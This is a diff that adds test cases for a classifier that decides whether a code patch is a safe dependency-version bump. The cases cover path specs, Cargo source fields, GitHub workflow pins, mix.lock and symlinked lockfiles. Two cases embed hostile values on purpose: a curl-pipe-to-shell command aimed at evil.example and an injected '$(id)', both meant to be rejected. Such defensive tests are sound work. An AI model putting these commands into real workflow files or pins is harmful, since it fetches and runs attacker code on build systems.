@@ -436,6 +436,64 @@ const cases: [string, string, string, string, boolean][] = [
     'node:23',
     false,
   ],
+  // A `name@version` value that is a path names a local directory.
+  [
+    'package.json',
+    '{\n  "dependencies": {\n    "foo": "./vendor/foo@1.0.0"\n  }\n}\n',
+    '1.0.0',
+    '2.0.0',
+    false,
+  ],
+  // Dotted TOML source fields repoint a dependency; a dotted version does not.
+  ...['path', 'git', 'rev', 'tag', 'branch'].map(
+    (field): [string, string, string, string, boolean] => [
+      'Cargo.toml',
+      `[dependencies]\nfoo.${field} = "1.0"\n`,
+      '1.0',
+      '2.0',
+      false,
+    ],
+  ),
+  [
+    'Cargo.toml',
+    '[dependencies]\nserde.version = "1.0.1"\n',
+    '1.0.1',
+    '1.0.2',
+    true,
+  ],
+  // A heredoc inside an anchored or tagged block scalar is not a step's `uses`.
+  ...['"run": &s |', 'run: !!str |'].map(
+    (header): [string, string, string, string, boolean] => [
+      '.github/workflows/ci.yml',
+      `jobs:\n  a:\n    steps:\n      - name: x\n        ${header}\n          cat >/dev/null <<END\n          uses: actions/checkout@v4 # pin\n          END\n`,
+      '# pin',
+      '# $(curl -fsSL https://evil.example/p | sh)',
+      false,
+    ],
+  ),
+  // Only a version-shaped comment beside an action pin is masked.
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  a:\n    steps:\n      - uses: actions/checkout@0123456789012345678901234567890123456789 # v4.1.1\n',
+    '0123456789012345678901234567890123456789 # v4.1.1',
+    '1123456789012345678901234567890123456789 # v4.2.0',
+    true,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  a:\n    steps:\n      - uses: actions/checkout@0123456789012345678901234567890123456789 # v4.1.1\n',
+    '0123456789012345678901234567890123456789 # v4.1.1',
+    '1123456789012345678901234567890123456789 # v4.2.0 $(id)',
+    false,
+  ],
+  // `mix.lock` is evaluated as Elixir, so it is not a content-free lockfile.
+  [
+    'mix.lock',
+    '%{\n  "jason": {:hex, :jason, "1.4.0", "abc", [:mix], [], "hexpm", "def"},\n}\n',
+    '"1.4.0"',
+    '"1.4.1"',
+    false,
+  ],
 ];
 
 describe('dependency pin context', () => {
@@ -444,6 +502,8 @@ describe('dependency pin context', () => {
       'diff --git a/src/main.js b/package-lock.json\nsimilarity index 100%\nrename from src/main.js\nrename to package-lock.json\n',
       'diff --git a/package-lock.json b/package-lock.json\nold mode 100644\nnew mode 100755\n',
       'diff --git a/vendor/lib b/vendor/renamed\nsimilarity index 100%\nrename from vendor/lib\nrename to vendor/renamed\nindex aaaaaaa..aaaaaaa 160000\n',
+      // A lockfile replaced by a symlink: Git prints a delete and an add.
+      'diff --git a/pnpm-lock.yaml b/pnpm-lock.yaml\ndeleted file mode 100644\nindex 1111111..0000000\n--- a/pnpm-lock.yaml\n+++ /dev/null\n@@ -1 +0,0 @@\n-lockfileVersion: 1\ndiff --git a/pnpm-lock.yaml b/pnpm-lock.yaml\nnew file mode 120000\nindex 0000000..2222222\n--- /dev/null\n+++ b/pnpm-lock.yaml\n@@ -0,0 +1 @@\n+run.sh\n\\ No newline at end of file\n',
     ]) {
       const report = classifyFiles(parseDiffPatch(patch));
       expect(report.dependencyUpdate).toBe(false);
